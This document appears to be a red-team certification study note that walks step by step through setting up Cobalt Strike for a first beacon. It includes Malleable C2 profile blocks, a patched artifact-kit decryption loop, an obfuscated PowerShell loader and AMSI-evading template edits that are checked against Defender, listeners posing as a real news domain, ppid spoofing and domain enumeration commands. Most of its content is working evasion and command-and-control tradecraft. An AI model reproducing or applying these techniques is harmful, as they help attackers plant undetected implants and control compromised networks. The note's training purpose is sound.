# Cobalt Strike Prepare  

The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create artifact, resource kit, listeners, load scripts, and disable AppLocker controls for first Beacon.  

* SSH to team server
* Malleable C2 profile Edit (stage + post-ex + process-inject blocks)
* Build **Artifact** Kit →  ThreatCheck + Ghidra clean
* Build **Resource** Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
* Add Cobalt Strike Listeners 
* Load CNA CS Script Manager
* Disable AppLocker intial access
* Initial Beacon
* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
* Test beacon callback with Defender ON 🛡️  

### SSH to team server

```bash
ssh attacker@10.0.0.5
# Password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

## Malleable C2 profile Edit

>Stage Block + Post-ex Block + Process-Inject Block

```c
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}

post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

>Apply and validate Malleable C2 profile updates  

```
sudo /usr/bin/docker restart cobaltstrike-cs-1

sudo /usr/bin/docker logs cobaltstrike-cs-1
```

## Build Artifact Kit

### Patch patch.c in VSCode

>Launch Visual Studio Code > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  

```cpp
// REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
x = length;
while ( x-- ) {
    * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}

// REPLACE Decryption loop with 
int x = length;
while ( x-- ) {
    * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

>Build in WSL (Ubuntu)  

```cpp
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

### ThreatCheck & Ghidra  

```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
```

>Ghidra to locate the flagged code at the offset ThreatCheck give  


## Build Resource Kit  

>Build templates in WSL (Ubuntu)  

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

>VSCode - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  

>Replace System.dll' with obfuscation:  

```powershell
# Before (AMSI-detected):
.Equals('System.dll')

.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('J1N5cycrJ3RlbS4nKydkbGwnCg==')))
# 'J1N5cycrJ3RlbS4nKydkbGwnCg==' = base64('Sys'+'tem.'+'dll')
```

>Replace Marshal.Copy with WriteProcessMemory:  

```powershell
# orginal code detected

$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# replacement obfuscated

$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
)
$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
```

>VSCode - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

>ThreatCheck AMSI  

```powershell
cd C:\Tools\cobaltstrike\custom-resources\
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

## Cobalt Strike Listeners  

### Connect to Cobalt Strike

1. On the Windows taskbar, click on the Cobalt Strike icon.
1. Fill in the connection details for the team server.
  1. Host: `10.0.0.5`
  1. Port: `50050`
  1. Password: `Passw0rd!`

### Create Listeners

Go to **Cobalt Strike > Listeners > Add** to create a new listener.

### HTTP Listener

1. Name: `http`
1. Payload: Beacon HTTP
1. HTTP Hosts: `www.bleepincomputer.com`
1. HTTP Host (Stager) : `www.bleepincomputer.com`

<img src="/images/cs_setup1.png">  

### SMB Listener

1. Name: `smb`
1. Payload: Beacon SMB
1. Pipename: `PSHost.133946823881593750.1234.DefaultAppDomain.powershell`  

<img src="/images/cs_setup2.png">  

### TCP Listener

1. Name: `tcp`
1. Payload: Beacon TCP
1. Port: `4444`
1. Bind to localhost: False

<img src="/images/cs_setup3.png">  

## TCP (local) Listener

1. Name: `tcp-local`
1. Payload: Beacon TCP
1. Port: `1337`
1. Bind to localhost: True

<img src="/images/cs_setup4.png">

# Load CNA Scripts  

>Script Manager > Load CNA - Aggressor Scripts:  

*    C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
*    C:\Tools\cobaltstrike\custom-resources\resources.cna
*    SA.cna  ← MUST be before exam-recon.cna
*    Remote.cna
*    kerbeus_cs.cna
*    exam-recon.cna
*    sql.cna

# Generate Payloads

> ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  

> First CHECK [Defence evasion Malleable C2 profile](https://github.com/botesjuan/CRTO-Study-Notes/blob/main/labs/defence-evasion-lab-Malleable.md#part-1--malleable-c2-profile)

<img src="/images/malleable-c2-profile-updates.png">  

> 1. Malleable C2 profile active (docker restart)  
> 2. Artifact Kit built → ThreatCheck clean → `artifact.cna` loaded in Script Manager  
> 3. Resource Kit built → ThreatCheck AMSI clean → `resources.cna` loaded in Script Manager  

> Now generate payloads — they will use the custom artifact stubs.  

1. Go to **Payloads > Windows Stageless Generate All Payloads**
2. Folder: `C:\Payloads`
3. Click **Generate**

<img src="/images/generate_payloads.png">  



# Interact with Beacon

1. Run *C:\Payloads\http_x64.exe* and a new Beacon session should appear.
1. Familiarise yourself with the client UI and running commands in Beacon.

⚠️ Use the `help` command to list all of the available commands, and `help [alias]` to get help for a specific command.

---






---

## First Beacon Checklist  

**Step 1 — beacon context (do this first, every beacon):**

```cs
beacon> sleep 3 20                                      // reduce check-in noise
beacon> ps                                              // get process list
beacon> ppid <explorer.exe or svchost.exe PID>          // spoof parent — see note below
beacon> spawnto x64 %windir%\sysnative\werfault.exe     // override default rundll32
beacon> getuid                                          // confirm user context
```

**Step 2 — ldapsearch immediately after (OPSEC-🟢SAFE — do this on every beacon without exception):**

ldapsearch is a BOF — no child process, no event logs, runs in beacon thread. It is the
fastest and safest way to map the entire domain. Run it before making any attack decisions.

```cs
// Single query — hits users, computers, and groups in one shot
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem

// Trust enumeration
beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes
```

**What to look for immediately in the output:**

| Finding | Next action |
|---------|------------|
| Account with `servicePrincipalName` set | Kerberoast candidate |
| `adminCount=1` with no DA group membership | Leftover ACLs — check with BloodHound |
| `trustPartner` results | Forest/domain trust attack paths |
| Computer names and roles (DB, FS, DC) | Plan lateral movement targets |

---

### `ppid` — No `explorer.exe` on WinRM Beacons

`explorer.exe` only runs in **interactive desktop sessions** (console or RDP login).
A beacon landed via `jump winrm64` runs inside `wsmprovhost.exe` — no interactive session,
no explorer.exe in the process list.

**Use `svchost.exe` as the ppid target instead:**

```cs
beacon> ps                          // find a svchost.exe PID running as SYSTEM or LOCAL SERVICE
beacon> ppid <svchost.exe PID>      // svchost spawning werfault = normal Windows behaviour
```

| Beacon landed via | `ppid` target |
|---|---|
| WinRM (`jump winrm64`) | `svchost.exe` |
| Interactive user session | `explorer.exe` |
| Service execution | `services.exe` or `svchost.exe` |

---

### `net computers` — OPSEC-🔴UNSAFE, and Fails from WinRM Token

`net computers` spawns `cmd.exe` as a child process — visible to Sysmon Event 1 and EDR.
It also fails with **Error 5 (Access Denied)** from a WinRM Type 3 network logon token
because the non-interactive token lacks sufficient privileges for domain enumeration over the network.

**Never use `net computers`. Use ldapsearch BOF instead (OPSEC-🟢SAFE):**

```cs
// Enumerate domain computers — OPSEC-🟢SAFE (BOF, no child process)
beacon> ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```

> ⚠️ ldapsearch also requires a valid Kerberos token — see note in Discovery lab.
